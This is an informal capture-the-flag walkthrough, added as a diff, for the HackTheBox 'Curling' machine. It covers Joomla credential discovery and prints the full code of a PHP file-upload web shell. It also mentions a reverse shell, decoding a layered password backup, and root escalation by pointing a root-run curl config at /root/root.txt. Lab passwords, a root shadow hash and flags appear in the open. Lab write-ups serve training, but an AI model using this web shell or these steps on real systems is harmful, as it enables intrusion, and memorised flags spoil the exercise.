@@ -1,0 +1,39 @@
+HTB CURLING
+
+1)Enumeration with nmap show us 2 open port 80,22
+2)Acces with browser its a joomla webpage with some info
+3)researching the source code we found a directory to upload and file called secret.txt with a base64 encoded password which is: Curling2018!
+Now reading on the webpage we see Super User posts but one of them its signed by a user named floris so we try to login with floris:Curling2018 and it worked.
+Now searching through dirs we found /administrator page for joomla login:
+and the same credentials worked well.
+now we must find a way to upload something.
+logged to joomla we found and interesting module to upload now just set it up and allow some file type like php to get your reverse shell
+***********************
+<?php echo '<b><br><br>'.php_uname().'<br></b>'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>toborbitch</b><br><br>'; } else { echo '<b>Upload Sucess !!!</b><br><br>'; } } ?>
+***********************
+4)Then we search a directory to upload files
+http://10.10.10.150/index.php/component/users/?view=remind&Itemid=101
+and accept php files so we try to upload a php-reverse shell and it worked
+now we are inside www-data user we see a pass backup
+now we see its a hexdump file so the method to decrypt this types of files its:
+xxd -r password_backup
+then the result file we have to see what type its so we use:
+file password_backup
+then change file extension to the type of file it its and decompress
+then again check file, change extension, decompress until you get something readable
+
+  xxd -r password_backup | bzip2 -d - | gzip -d - | bzip2 -d - | tar -xvf - 
+
+5)Now we got the password: for floris user which is : 5d<wdCbdZu)|hChXll
+6)login in through ssh and get the user flag.
+7)Now for privilege scalation
+8)We see a folder called admin-area its seems suspicious so we go to dir and we found to files one called input which parses all 127.0.0.1 data to the other file named report. and its running as root! so we can take advantage on this:
+On the input file we can overwrite its contents and put:
+url = "file:///root/root.txt"
+before it was url= "http://127.0.0.1/""
+and automatic you will get you key
+from etc/shadow  root hash>>>>  $6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c.bljjnn6FMF1
+ 
+and we got the root flag: 82c198ab6fc5365fdc6da2ee5c26064a
+ 
+**********************************************
